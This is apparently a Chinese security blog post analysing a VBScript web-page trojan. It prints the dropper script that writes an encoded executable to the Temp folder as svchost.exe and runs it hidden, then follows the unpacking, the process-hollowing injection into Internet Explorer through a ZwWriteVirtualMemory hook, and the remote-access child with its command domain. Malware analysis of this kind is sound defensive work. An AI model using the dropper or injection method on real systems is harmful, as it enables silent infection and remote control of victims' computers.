---
published: true
title: VBS页面木马简单分析
layout: post
tags: [安全, 逆向]
categories: [安全]
---

### 简述

最近监控到一种VBS网页挂马数量大规模爆发，影响近数万的site，初步怀疑数量的井喷与最近连续爆出的高危漏洞有关，这里对其中使用到的加密注入技术进行简单分析。

像骗子一般会用比较低级的骗术过滤掉聪明的人来降低行骗成本，这个木马也同样是这样，直接在页面中用VBS写编码后的PE文件，简单粗暴，只有IE的安全级别为低且允许运行VBS的情况下才会中招。一般这样的用户没有什么安全意识，电脑也基本没有防护，控制者几乎可以为所欲为。

简单粗暴的挂马代码如下

```vbscript
DropFileName = "svchost.exe"
// 编码后的PE文件
WriteData = "4D5A90000300000..."
Set FSO = CreateObject("Scripting.FileSystemObject")
// 保存文件为Temp文件夹下的svchost.exe
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath) = False Then
    Set FileObj = FSO.CreateTextFile(DropPath, True)
    For i = 1 To Len(WriteData) Step 2
        FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
    Next
    FileObj.Close
End If
// 运行该程序
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
```

把挂马的PE文件内容保存下来，通过下面的代码还原成二进制文件。

```python
import re
arr = re.compile('.{2}').findall(open('virus').read())
open('virus.pe', 'w').write(''.join([chr(int(i, 16)) for i in arr]))
```

### 脱壳解密

PEID查壳，显示为```UPX 0.89.6 - 1.02 / 1.05 - 1.24 -> Markus & Laszlo```，直接ESP下断脱掉后放入IDA中分析，查看字符串，发现并没有什么特别的东西，有很多API字符串，判断代码还是被加密，分析找到解密代码如下，算法比较简单。

```
UPX0:004084AA 8D 7F 01                  lea     edi, [edi+1]
UPX0:004084AD FF 77 01                  push    dword ptr [edi+1]
UPX0:004084B0 8A 24 24                  mov     ah, byte ptr [esp+8+var_8]
UPX0:004084B3 E9 81 EF FF FF            jmp     loc_407439

loc_407439: 
UPX0:00407439 83 C4 04                  add     esp, 4
UPX0:0040743C 80 F4 A2                  xor     ah, 0A2h
UPX0:0040743F C0 C4 16                  rol     ah, 16h
UPX0:00407442 C0 CC 08                  ror     ah, 8
UPX0:00407445 80 EC 6C                  sub     ah, 6Ch
UPX0:00407448 30 61 00                  xor     [ecx+0], ah
UPX0:0040744B 41                        inc     ecx
UPX0:0040744C 4A                        dec     edx
UPX0:0040744D 8B DA                     mov     ebx, edx
UPX0:0040744F 81 EB 09 58 CD 2F         sub     ebx, 2FCD5809h
UPX0:00407455 52                        push    edx
UPX0:00407456 53                        push    ebx
UPX0:00407457 8B D4                     mov     edx, esp
UPX0:00407459 81 42 00 09 58 CD 2F      add     dword ptr [edx+0], 2FCD5809h
UPX0:00407460 5B                        pop     ebx
UPX0:00407461 5A                        pop     edx
UPX0:00407462 0F 85 42 10 00 00         jnz     loc_4084AA
UPX0:00407468 E8 75 0F 00 00            call    sub_4083E2    ;跳转到解密后代码
UPX0:0040746D C3                        retn
```

这里代码跳转后，依旧还是一段用来解密的shell，OD中跟几步，发现它在读写0x400000的PE头，判断它会把解密后的代码写回.text段，直接在0x401000处下硬件写入断点，几次F9后到解密代码，继续往下跟，在调用LoadLibrary和GetProcessAddress重建导入表后跳转到真正的EP，在这里dump后用ImportREC重建输入表拖入IDA中分析。

### 母体分析

这是一个典型的恶意程序母体，它只做下面三步：

1. 创建"KyUffThOkYwRRtgPP"互斥体，保证只有一个实例在运行;

2. 从注册表中读取IE的文件目录，将自身写入IE文件夹中，命名为DesktopLayer.exe并执行，原始进程退出。

3. 若自身的进程名为DesktopLayer.exe，进入正常流程。正常流程调用CreateProcess启动一个IE进程，并将子体注入IE中运行。注入过程比较有意思，详细分析一下：

* 第一步：挂起自身所有线程，用inline hook方法hook ZwWriteVirtualMemory函数，再恢复线程执行，实际上这里并没有多线程环境，病毒作者应该是使用了通用hook库。可以看下面ZwWriteVirtualMemory函数hook前后的对比。

```
ntdll.ZwWriteVirtualMemory 
7C92DFAE       B8 15010000         mov eax,115
7C92DFB3       BA 0003FE7F         mov edx,7FFE0300
7C92DFB8       FF12                call dword ptr ds:[edx]
7C92DFBA       C2 1400             retn 14

ntdll.ZwWriteVirtualMemory
7C92DFAE       E9 A64AAD83         jmp DesktopL.00402A59
7C92DFB3       BA 0003FE7F         mov edx,7FFE0300
7C92DFB8       FF12                call dword ptr ds:[edx]
7C92DFBA       C2 1400             retn 14
```

* 第二步：调用CreateProcess来创建IE进程，CreateProcess会调用CreateProcessInternalW函数来处理真正的创建进程流程，这个函数中最终会调用ZwWriteVirtualMemory函数来将程序文件和DLL库写到新进程的地址空间中，这个过程自然就触发了hook函数的执行。

* 第三步: 通过hook函数向子进程的0x20010000处注入长度为0x9800的子体，并且继续注入几段代码和数据，然后调用ZwQueryInformationProcess获得子进程加载基址，在其EP处写入12个字节。这12个字节是三条汇编指令，作用是跳转执行恶意代码。12字节指令如下：

```
0040DFA7  BF 00000400         mov edi,40000   // 0x40000和0x50000是调用VirtualAlloc申请内存时
0040DFAC  68 00000500         push 50000      // 返回，不同机器和环境返回值不一样
0040DFB1  FFD7                call edi
```

到此IE进程已经被掏空并塞满了恶意代码，进程创建完毕后，主线程一旦开始执行，便会跳转到恶意代码处，此时IE进程已经成了披着羊皮的狼。总结其母体代码流程如下:

```c++
void __usercall start(unsigned __int8 *a1<edi>)
{
  int mutex_handler; // eax@2
  DWORD len; // eax@5

  if ( get_ie_exe_path(&ie_exe_path, 0x400u) == 1 )
  {
    mutex_handler = create_mutex("KyUffThOkYwRRtgPP");
    if ( mutex_handler )
    {
      close_mutex((HANDLE)mutex_handler);
      mutex_handler = 1;
    }
    if ( mutex_handler == 1 )
    {
      len = GetModuleFileNameA(NULL, module_file_name, 0x104u);
      set_end_of_str(module_file_name, len);
      if ( copy_self_to_ie_path(module_file_name) == 1 )
        ExitProcess(0);
      if ( get_APIs_address() == 1 )
      {
        inline_hook_function(a1);
        create_process((LPSTR)&ie_exe_path, 1u);
        unhook_function();
      }
    }
  }
  ExitProcess(0);
}
```

### 子体分析

在母体进行代码注入时，总共会调用VirtualAllocEx和WriteProcessMemory注入下面列出的六次代码：

```
LoaclAddress   RemoteAddress   Size
0x20010000     0x20010000      0xD0000
0x004022F0     0x00020000(*)   0x233
0x00402523     0x00030000(*)   0xDF
0x00401F5D     0x00040000(*)   0xAF
0x00121FEC     0x00050000(*)   0x138
0x0040DFA7     0x00402451      0xC
```

写到0x20010000处的代码是病毒子体，直接从母体中把子体抓出是无法分析的，其代码做了加密，并且缺少几段一同注入的解密代码。

这里有两个思路，一种是在VirtualAllocEx和WriteProcessMemory下断，把第一个参数hProcess换成-1，让它把代码写入自己的内存，在拷贝最后12个字节时将EIP跳过去开始执行；另一种是把最后拷贝到子进程的12个字节中第一个字节换成CC，并且把OD设置为默认调试器，子进程开始运行会自动触发int 3断点被OD attach上，恢复第一个字节，继续跟踪即可。

我这里选择了第一种方式，用这种方法跳转后的代码依旧是shell，完成对子体代码的导入表修复和重定向，最终才会跳转到0x20017c79处真正的子体代码开始执行。

到此，木马子体已经完全释放完毕，在其每个线程的入口处添加断点，跟踪几步便可看到上线域名fget-career.com。

从OD对0x20010000内存段的反汇编可以大致看出其功能，一个很典型的远控木马，这里不再详细分析。在线行为分析报告参考这里。[行为分析报告](http://a.virscan.org/ff5e1f27193ce51eec318714ef038bef)

病毒文件MD5: ff5e1f27193ce51eec318714ef038bef

脱壳后文件MD5: 7bb9db2b8b37a918ab101d0687a9866b
